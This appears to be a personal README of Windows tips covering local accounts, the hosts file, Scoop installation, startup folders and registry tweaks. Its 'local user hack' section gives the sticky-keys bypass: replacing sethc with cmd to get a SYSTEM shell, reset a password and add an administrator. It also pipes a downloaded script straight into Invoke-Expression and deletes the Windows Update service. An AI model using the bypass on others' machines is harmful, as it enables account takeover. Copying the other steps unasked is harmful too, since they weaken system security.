# winask
windows asker

# user hack

## add local user
windows 11 local account
1. ```[fn] + [shift] + [f10]```
2. ```start ms-cxh:localonly```

## local user hack
* restart to firmware, ```[shift] + [click]``` on restart

* open ```cmd``` console
```
c:
cd \windows\system32
rename sethc sethc-2
rename cmd sethc
```
* rename ```sethc```, then rename ```cmd``` to ```sethc```

* press ```[shift]``` 5 times
```
net localgroup administrators
net user <username> *
```
* change password

* add a user to administrators
```
net localgroup administrators <username> /add
```

# local DNS hack
* file location:
```C:\Windows\System32\drivers\etc\hosts```

* ---contains---
```
# sample
127.0.0.1 www.example.com
```

# install scoop
using powershell
```
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
```
install any package like ngrok, nodejs, git and php
```
scoop install ngrok
scoop install nodejs
scoop install git
scoop bucket add versions
scoop install php84
```

# hide all the way
sample
```
attrib +H +S +A +R C:\9r3i
```
*) _setup niner directory_

# startup apps
```
shell:startup
```
folder location:
```%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup```
or
```C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup```

# ms-gamingoverlay error
```
reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR /f /t REG_DWORD /v "AppCaptureEnabled" /d 0
reg add HKEY_CURRENT_USER\System\GameConfigStore /f /t REG_DWORD /v "GameDVR_Enabled" /d 0
```

# delete the update service
```wuauserv``` = win update service

delete this to prevent auto update that make me sick
```
sc delete wuauserv
```

# end of line
nothing more here




